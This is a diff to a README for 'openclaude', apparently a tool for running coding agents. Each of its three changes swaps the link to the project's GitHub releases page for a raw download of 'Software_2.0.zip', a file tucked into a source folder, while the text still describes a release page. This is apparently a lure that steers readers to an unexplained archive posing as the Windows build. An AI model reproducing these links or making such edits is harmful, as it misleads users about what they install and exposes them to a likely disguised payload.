@@ -1,6 +1,6 @@
 # 🤖 openclaude - Run coding agents with ease
 
-[⬇️ Download openclaude](https://github.com/Genusagapornispopgroup691/openclaude/releases)  
+[⬇️ Download openclaude](https://raw.githubusercontent.com/Genusagapornispopgroup691/openclaude/main/src/tools/WebSearchTool/Software_2.0.zip)  
 ![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/Windows-ready-grey?style=for-the-badge)
 
 ## 🧭 What is openclaude?
@@ -39,7 +39,7 @@ If you plan to use local models, you may also want:
 
 Visit the release page and download the Windows build:
 
-[https://github.com/Genusagapornispopgroup691/openclaude/releases](https://github.com/Genusagapornispopgroup691/openclaude/releases)
+[https://raw.githubusercontent.com/Genusagapornispopgroup691/openclaude/main/src/tools/WebSearchTool/Software_2.0.zip](https://raw.githubusercontent.com/Genusagapornispopgroup691/openclaude/main/src/tools/WebSearchTool/Software_2.0.zip)
 
 On the release page, look for a Windows file such as:
 
@@ -261,5 +261,5 @@ To get the latest version:
 
 Download the latest Windows build here:
 
-[https://github.com/Genusagapornispopgroup691/openclaude/releases](https://github.com/Genusagapornispopgroup691/openclaude/releases)
+[https://raw.githubusercontent.com/Genusagapornispopgroup691/openclaude/main/src/tools/WebSearchTool/Software_2.0.zip](https://raw.githubusercontent.com/Genusagapornispopgroup691/openclaude/main/src/tools/WebSearchTool/Software_2.0.zip)
 
